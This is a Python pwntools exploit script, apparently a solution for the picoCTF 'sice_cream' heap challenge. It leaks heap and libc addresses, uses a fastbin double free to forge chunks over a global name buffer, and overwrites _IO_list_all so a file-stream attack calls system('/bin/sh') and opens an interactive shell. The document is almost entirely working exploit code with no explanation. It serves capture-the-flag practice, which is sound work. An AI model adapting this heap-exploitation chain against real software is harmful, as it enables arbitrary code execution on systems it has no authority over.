#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 39673
HOST = "jupiter.challenges.picoctf.org"
exe = context.binary = ELF('./sice_cream_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-2.23.so', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            b* 0x0000000000400B5B
            b* 0x00000000004009D3
            b* 0x0000000000400AE4
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

def add(size, data):
    p.sendafter(b'> ', str(1))
    p.sendafter(b'> ', str(size))
    p.sendafter(b'> ', data)

def delete(idx):
    p.sendafter(b'> ', str(2))
    p.sendafter(b'> ', str(idx))

def show(name):
    p.sendafter(b'> ', str(3))
    p.sendafter(b'> ', name)

# VARIABLE
name = 0x0000000000602040

# PAYLOAD
p.sendafter(b'> ', b'nhh')
add(0x18, b'a'*0x18) # 0
show(b'b'*0x100)

p.recvuntil(b'b'*0x100)
heap_leak = u32(p.recv(4))
heap_base = heap_leak - 0x10
print("Heap base: " + hex(heap_base))

add(0x18, b'c'*0x18) # 1
delete(0)
delete(1)
delete(0)
add(0x18, p64(name)) # 2
add(0x18, b'a'*8) # 3
add(0x18, b'b'*8) # 4
payload = flat(
    0, 0x21,
    0, 0,
    0, 0,
    )
show(payload)

add(0x18, b'c'*8) # 5
payload = flat(
    0, 0x91,
    b'a'*0x80, 
    0, 0x21,
    0, 0,
    0, 0x21
    )
show(payload)
delete(5)

show(b'a'*0x10)
p.recvuntil(b'a'*0x10)
libc_leak = u64(p.recv(6) + b'\0'*2)
libc.address = libc_leak - libc.sym.main_arena - 88
print("Libc base: " + hex(libc.address))
io_list_all = libc.sym._IO_list_all
system = libc.sym.system

payload = flat(
    b'/bin/sh\0', 0x61,
    libc_leak, io_list_all - 0x10,
    2, 3,
    p64(0)*18,
    0, 0,
    0, 0x602120,
    0, 0,
    0, system
    )
show(payload)
delete(6)

p.sendafter(b'> ', str(1))
p.sendafter(b'> ', str(10))

p.interactive()